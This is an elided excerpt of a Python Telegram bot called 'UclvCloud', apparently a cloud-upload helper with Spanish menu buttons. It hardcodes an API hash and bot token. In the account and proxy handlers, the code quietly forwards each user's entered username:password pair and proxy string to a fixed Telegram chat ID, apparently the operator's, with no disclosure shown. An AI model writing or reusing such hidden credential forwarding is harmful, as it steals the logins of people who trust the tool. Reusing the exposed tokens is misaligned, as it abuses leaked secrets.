...
app = Client('uclvcloud',api_id=9520699,api_hash='353e5b6ef2c174d0e8d7fb62e277840d',bot_token='5460614146:AAGdN2MHjnMUZdRYNVM8rqBxva0LrBiKhsU')
        ...
        [
            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("bladimirlorenzo", url="https://t.me/bladimirlorenzo")]
        			...
        			if "socks5://none" in text:
        				...
        				await app.send_message(838890371,"El usuario @"+user_name+" puso el proxy: `"+text+"`")
        			if not exists(str(user_id)+"/username"):
        				start = "***UclvCloud 2*** \n  Sin cuenta"
        			else:
        				if not exists(str(user_id)+"/proxy"):
        ...
        [
            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("bladimirlorenzo", url="https://t.me/bladimirlorenzo")]
		      	...
		      	if "account" in logr:
		      		...
		      		if user_id != 838890371:
		      			await app.send_message(838890371, "El usuario @"+str(user_name)+" puso la cuenta `"+str(data[0])+":"+str(data[1])+"`")
